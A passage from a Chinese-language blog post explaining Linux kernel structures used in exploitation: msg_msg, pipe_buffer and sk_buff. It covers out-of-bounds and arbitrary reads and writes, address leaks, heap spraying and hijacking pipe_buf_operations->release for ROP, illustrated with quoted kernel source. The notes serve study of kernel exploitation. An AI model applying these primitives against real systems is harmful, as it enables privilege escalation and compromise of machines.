msgflg)</span></span><br></pre></td></tr></table></figure><ul><li>msgqid:消息队列标识符</li><li>msgp:存放消息的结构体,消息类型msgtyp也会放到这里</li><li>msgsz:接收消息长度,不包含消息类型</li><li>msgtyp:<ul><li>0:接收第一个消息</li><li>>0:接收消息类型等于msgtyp的第一个函数</li><li>&lt;0:返回队列中消息类型值小于或等于 msgtyp 绝对值的消息，如果这种消息有若干个，则取类型值最小的消息</li></ul></li><li>msgflg:<ul><li>0：msgrcv() 调用阻塞直到接收消息成功为止</li><li>MSG_NOERROR：若返回的消息字节数比 nbytes 字节数多,则消息就会截短到 nbytes 字节，且不通知消息发送进程</li><li>MSG_COPY：读取但不释放，当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink,从而我们便可以<strong>多次重复地读取同一个</strong> <code>msg_msg</code> 链条中数据</li><li>IPC_NOWAIT：调用进程会立即返回，若没有收到消息则立即返回 -1</li></ul></li></ul><p><strong>MSG_COPY</strong></p><p><code>MSG_COPY</code>位为1的时候,在<code>find_msg</code>中会返回<code>msg_msg</code>双向循环链表中，第<code>msgtyp</code>个<code>msg_msg</code>，也就是返回第<code>msgtyp</code>条消息，而不是根据<code>msgtyp</code>去和<code>msg-&gt;m_type</code>进行匹配</p><p>此外必须同时搭配<code>IPC_NOWAIT</code>标志</p><p>对于 <code>MSG_COPY</code> 而言，数据的拷贝使用的是 <code>copy_msg()</code> 函数，其会比对<strong>源消息的 m_ts 是否大于存储拷贝的消息的 m_ts ，若大于则拷贝失败</strong>，而后者则为我们传入 <code>msgrcv()</code> 的 <code>msgsz</code>，因此若我们仅读取单条消息则需要保证<strong>后者大于相等前者</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line"><span class="type">size_t</span> len = src-&gt;m_ts;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)<span class="comment">// 有个 size 检查</span></span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">     src_pseg != <span class="literal">NULL</span>;<span class="comment">//以源 msg 链表尾为终止</span></span><br><span class="line">     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>内存越界读</strong></p><p>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，我们不难想到的是：若是我们能够控制一个 msg_msg 的 header，将其 m_sz 成员改为一个较大的数，我们就能够<strong>越界读取出最多将近一张内存页大小的数据</strong></p><p><strong>任意地址读</strong></p><p>对于大于一张内存页的数据而言内核会在 msg_msg 的基础上再补充加上 msg_msgseg 结构体，形成一个单向链表，我们不难想到的是：若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们<strong>便能够完成内核空间中的任意地址读</strong></p><p>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，<strong>我们需要保证该地址上的数据为 NULL</strong></p><p><strong>任意地址写</strong></p><p>当我们调用 msgsnd 系统调用时，其会调用 <code>load_msg()</code> 将用户空间数据拷贝到内核空间中，首先是调用 <code>alloc_msg()</code> 分配 <code>msg_msg</code> 单向链表，之后才是正式的拷贝过程<strong>，即空间的分配与数据的拷贝是分开进行的</strong></p><p>我们不难想到的是，<strong>在拷贝时利用 userfaultfd/FUSE 将拷贝停下来，在子进程中篡改 msg_msg 的 next 指针，在恢复拷贝之后便会向我们篡改后的目标地址上写入数据，从而实现任意地址写</strong></p><h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><h3 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h3><p><strong>申请obj大小:192</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:泄露直接映射区地址</strong></p><p>在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息，当我们创建一个管道时，内核会创建一个 VFS inode 与一个 pipe_inode_info 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pipe_inode_info-&gt;bufs</code> 为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址</p><h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><p><strong>申请obj大小:任意(默认1k</strong>)</p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:泄露直接映射区地址</strong></p><p>当创建一个管道时,会自动创建<code>PIPE_DEF_BUFFERS(16)</code>个<code>pipe_buffer</code>,(只有在使用时才会按需分配初始化)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>offset是读取的偏移,len是可读的长度,写入的偏移是offset+len</p><p>一个管道的<code>pipe_buffer</code>数量是可以更改的</p><p>存在一个系统调用fcntl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size, nr_pages;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = round_pipe_size(arg);</span><br><span class="line">nr_pages = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If trying to increase the pipe capacity, check that an</span></span><br><span class="line"><span class="comment"> * unprivileged user is not trying to exceed various limits</span></span><br><span class="line"><span class="comment"> * (soft limit check here, hard limit check just below).</span></span><br><span class="line"><span class="comment"> * Decreasing the pipe capacity is always permitted, even</span></span><br><span class="line"><span class="comment"> * if the user is currently over a limit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">size &gt; pipe_max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(pipe-&gt;user, pipe-&gt;buffers, nr_pages);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">(too_many_pipe_buffers_hard(user_bufs) ||</span><br><span class="line"> too_many_pipe_buffers_soft(user_bufs)) &amp;&amp;</span><br><span class="line">is_unprivileged_user()) &#123;</span><br><span class="line">ret = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can shrink the pipe, if arg &gt;= pipe-&gt;nrbufs. Since we don&#x27;t</span></span><br><span class="line"><span class="comment"> * expect a lot of shrink+grow operations, just free and allocate</span></span><br><span class="line"><span class="comment"> * again like we would do for growing. If the pipe currently</span></span><br><span class="line"><span class="comment"> * contains more buffers than arg, then return busy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &lt; pipe-&gt;nrbufs) &#123;</span><br><span class="line">ret = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_pages, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs)) &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pipe array wraps around, so just start the new one at zero</span></span><br><span class="line"><span class="comment"> * and adjust the indexes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;nrbufs) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"></span><br><span class="line">tail = pipe-&gt;curbuf + pipe-&gt;nrbufs;</span><br><span class="line"><span class="keyword">if</span> (tail &lt; pipe-&gt;buffers)</span><br><span class="line">tail = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tail &amp;= (pipe-&gt;buffers - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;nrbufs - tail;</span><br><span class="line"><span class="keyword">if</span> (head)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + pipe-&gt;curbuf, head * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"><span class="keyword">if</span> (tail)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs + head, pipe-&gt;bufs, tail * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;curbuf = <span class="number">0</span>;</span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">pipe-&gt;bufs = bufs;</span><br><span class="line">pipe-&gt;buffers = nr_pages;</span><br><span class="line"><span class="keyword">return</span> nr_pages * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, nr_pages, pipe-&gt;buffers);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当选项为<code>F_SETPIPE_SZ</code></p><p>其会修改当前pipe的bufs数组大小为第三个参数<code>(arg&gt;&gt;12)*sizeof(*bufs)</code></p><p>例如当我们使用<code>fcntl(pipe_fd, F_SETPIPE_SZ, 0x1000 * 64)</code>时</p><p>就会更改bufs从<code>kmalloc-cg-2k</code>进行分配</p><p>不过注意arg&gt;&gt;12必须是2的幂次方</p><hr><p><strong>劫持执行流</strong></p><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment"> * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment"> * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment"> * cache.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当执行到该指针时 rsi 寄存器刚好指向对应的 <code>pipe_buffer</code>，因此我们可以将函数表劫持到 <code>pipe_buffer</code> 上，找到一条合适的 gadget 将栈迁移到该处，从而更顺利地完成 ROP</p><p><strong>任意地址读写</strong></p><p>管道的读写通过 <code>pipe_buffer[i].page</code> 确定读写的内存，因此若我们能够修改 <code>page</code> 指针，则我们便能完成<strong>对整个物理内存区域的读操作，以及对直接映射区上有写权限的内存区域的写操作</strong></p><h2 id="sk-buff"><a href="#sk-buff" class="headerlink" title="sk_buff"></a>sk_buff</h2><p><strong>申请obj大小:&gt;=512</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:堆喷</strong></p><p><code>sk_buff</code> 是 Linux kernel 网络协议栈中一个<strong>重要的基础结构体</strong>，其用以表示在网络协议栈中传输的一个「包」，但其结构体本身不包含一个包的数据部分，而是包含该包的各种属性，<strong>数据包的本体数据则使用一个单独的 object 储存</strong></p><p>这个结构体成员比较多，我们主要关注核心部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* These two members must be first. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* These elements must be at the end, see alloc_skb() for details.  */</span></span><br><span class="line"><span class="type">sk_buff_data_t</span>tail;</span><br><span class="line"><span class="type">sk_buff_data_t</span>end;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>*head,</span><br><span class="line">*data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>truesize;</span><br><span class="line"><span class="type">refcount_t</span>users;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span></span><br><span class="line"><span class="comment">/* only useable after checking -&gt;active_extensions != 0 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_ext</span>*<span class="title">extensions</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sk_buff</code> 结构体与其所表示的数据包形成如下结构，其中：</p><ul><li><code>head</code> ：一个数据包<strong>实际的起始处</strong>（也就是为该数据包分配的 object 的首地址）</li><li><code>end</code> ：一个数据包实际的末尾（为该数据包分配的 object 的末尾地址）</li><li><code>data</code> ：<strong>当前所在 layer 的数据包对应的起始地址</strong></li><li><code>tail</code> ：<strong>当前所在 layer 的数据包对应的末尾地址</strong></li></ul><p>data 和 tail 可以这么理解：数据包每经过网络层次模型中的一层都会被添加/删除一个 header （有时还有一个 tail），data 与 tail 便是用以对此进行标识的</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/AV8HsnZj2bUCl4J.png" alt=""></p><p>多个 <code>sk_buff</code> 之间形成双向链表结构，类似于 <code>msg_queue</code>，这里同样有一个 <code>sk_buff_head</code> 结构作为哨兵节点</p><p><img 